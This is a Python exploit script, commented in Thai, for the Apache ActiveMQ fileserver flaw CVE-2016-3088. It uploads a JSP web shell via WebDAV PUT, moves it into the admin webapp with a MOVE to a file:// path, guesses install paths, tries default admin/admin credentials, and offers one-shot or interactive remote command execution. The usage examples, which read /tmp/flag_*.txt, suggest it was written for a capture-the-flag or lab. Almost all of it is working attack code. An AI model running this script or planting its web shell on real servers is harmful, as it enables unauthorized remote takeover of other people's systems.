#!/usr/bin/env python3
"""Apache ActiveMQ CVE-2016-3088 - fileserver PUT + MOVE -> JSP RCE.

ActiveMQ < 5.14 : webapp ``fileserver`` เป็น WebDAV ที่เขียนไฟล์ได้ และ Jetty
ยอมให้ ``MOVE`` ไฟล์ไปที่ ``file://`` path อื่น (เช่น webapps/admin) -> วาง JSP
แล้วรันคำสั่งบนเครื่องได้

ตัวอย่าง
-------
python tools/activemq_cve_2016_3088.py --url http://target:8161 --user admin --pass admin --cmd id
python tools/activemq_cve_2016_3088.py --url http://target:8161 --user admin --pass admin --cmd "cat /tmp/flag_*.txt"
python tools/activemq_cve_2016_3088.py --url http://target:8161 --user admin --pass admin --shell
python tools/activemq_cve_2016_3088.py --url http://target:8161 --user admin --pass admin --cmd id \
    --webapps /opt/apache-activemq/webapps

หมายเหตุ:
- PUT ไฟล์ .jsp มักถูกบังคับ Basic Auth (401) แม้ .txt จะไม่ต้อง -> ส่ง auth ทุกครั้ง
- ถ้า MOVE ตอบ 500 แปลว่า path ปลายทางไม่มีจริง สคริปต์จะไล่ candidate ให้
"""

import argparse
import html
import random
import re
import string
import sys

try:
    import requests
except ImportError:
    sys.exit("ต้องติดตั้ง requests ก่อน: pip install requests")

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass


JSP = r'''<%@ page import="java.util.*,java.io.*" %><%
String c = request.getParameter("c");
if (c != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  out.print("<pre>");
  while ((line = br.readLine()) != null) out.println(line);
  out.print("</pre>");
}
%>'''

CANDIDATES = [
    "/opt/activemq/webapps",
    "/opt/apache-activemq/webapps",
    "/usr/local/activemq/webapps",
    "/opt/apache-activemq-5.13.3/webapps",
    "/opt/apache-activemq-5.13.2/webapps",
    "/opt/apache-activemq-5.12.0/webapps",
    "/opt/apache-activemq-5.11.1/webapps",
    "/opt/apache-activemq-5.10.0/webapps",
    "/apache-activemq/webapps",
    "/opt/amq/webapps",
]


def token(n=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def put(session, url, path, data):
    return session.put(url + path, data=data, timeout=20)


def move(session, url, src, dest):
    return session.request("MOVE", url + src, headers={"Destination": dest}, timeout=20)


def find_webapps(session, url):
    """PUT ไฟล์ txt แล้ว MOVE ไป admin ของแต่ละ candidate -> 204 = ถูก"""
    name = "probe_%s.txt" % token()
    body = ("probe-%s" % name).encode()
    r = put(session, url, "/fileserver/" + name, body)
    if r.status_code not in (200, 201, 204):
        print("[-] PUT ลง /fileserver ไม่ได้: %s" % r.status_code)
        return None, None
    src = "/fileserver/" + name
    for base in CANDIDATES:
        dest = "file://%s/admin/%s" % (base, name)
        r = move(session, url, src, dest)
        if r.status_code in (200, 201, 204):
            chk = session.get(url + "/admin/" + name, timeout=20)
            if chk.status_code == 200 and body.decode() in chk.text:
                print("[+] webapps = %s" % base)
                return base, name
        # ถ้า MOVE สำเร็จแต่ไฟล์ไม่อยู่ ให้ PUT ใหม่รอบหน้า
        if r.status_code not in (200, 201, 204):
            put(session, url, "/fileserver/" + name, body)
    print("[-] หา webapps path ไม่เจอ (ลอง --webapps /path/webapps)")
    return None, name


def deploy(session, url, webapps):
    jsp = "sec_%s.jsp" % token()
    r = put(session, url, "/fileserver/" + jsp, JSP.encode())
    if r.status_code not in (200, 201, 204):
        print("[-] PUT .jsp ไม่ผ่าน: %s (ต้องมีสิทธิ์ admin?)" % r.status_code)
        return None
    dest = "file://%s/admin/%s" % (webapps, jsp)
    r = move(session, url, "/fileserver/" + jsp, dest)
    if r.status_code not in (200, 201, 204):
        print("[-] MOVE .jsp ไม่ผ่าน: %s" % r.status_code)
        return None
    print("[+] JSP deployed: %s/admin/%s" % (url, jsp))
    return jsp


def run(session, url, jsp, cmd):
    r = session.get(url + "/admin/" + jsp, params={"c": cmd}, timeout=90)
    m = re.search(r"<pre>(.*?)</pre>", r.text, re.S)
    if m:
        return html.unescape(m.group(1))
    if r.status_code != 200:
        return "[!] HTTP %s" % r.status_code
    return r.text[:500]


def main():
    ap = argparse.ArgumentParser(description="CVE-2016-3088 ActiveMQ fileserver RCE")
    ap.add_argument("--url", required=True, help="http://target:8161")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--pass", dest="password", default="admin")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--shell", action="store_true", help="อ่านคำสั่งจาก stdin วนไปเรื่อยๆ")
    ap.add_argument("--webapps", help="path ของ webapps บนเครื่อง เช่น /opt/activemq/webapps")
    args = ap.parse_args()

    url = args.url.rstrip("/")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    session.auth = (args.user, args.password)

    chk = session.get(url + "/admin/", timeout=20)
    print("[*] /admin/ -> HTTP %s" % chk.status_code)
    if chk.status_code == 401:
        raise SystemExit("[-] auth ไม่ผ่าน (ลอง --user/--pass)")

    if args.webapps:
        webapps = args.webapps.rstrip("/")
    else:
        webapps, _ = find_webapps(session, url)
        if not webapps:
            raise SystemExit("[-] ระบุ --webapps เอง")

    jsp = deploy(session, url, webapps)
    if not jsp:
        raise SystemExit("[-] deploy JSP ไม่สำเร็จ")

    if args.shell:
        try:
            while True:
                cmd = input("amq# ").strip()
                if not cmd:
                    continue
                if cmd in ("exit", "quit"):
                    break
                print(run(session, url, jsp, cmd))
        except (EOFError, KeyboardInterrupt):
            print()
    else:
        print(run(session, url, jsp, args.cmd))


if __name__ == "__main__":
    main()
